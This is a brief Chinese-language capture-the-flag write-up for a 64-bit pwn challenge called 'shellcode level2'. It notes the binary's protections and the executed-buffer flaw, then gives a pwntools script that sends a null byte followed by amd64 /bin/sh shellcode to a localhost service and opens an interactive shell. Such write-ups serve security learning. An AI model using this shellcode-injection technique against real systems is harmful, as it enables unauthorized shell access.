# shellcode level2

## 文件分析

下载`shellcode_level2`, NX off, PIE on, Canary on, RELRO full  
ghidra分析为64位程序

## 逆向

该程序用gets读入100字节，shellcode随便打  
程序运行一个变量+1对应的地址，且该变量首字节不为0则全部置0  
即先放一个`\0`再放shellcode即可

## EXPLOIT

```python
from pwn import *
shc = asm(shellcraft.amd64.linux.sh(), arch='amd64')
sh = remote("localhost", 45341)
sh.sendline(b'\0' + shc)
sh.interactive()
```

Done.
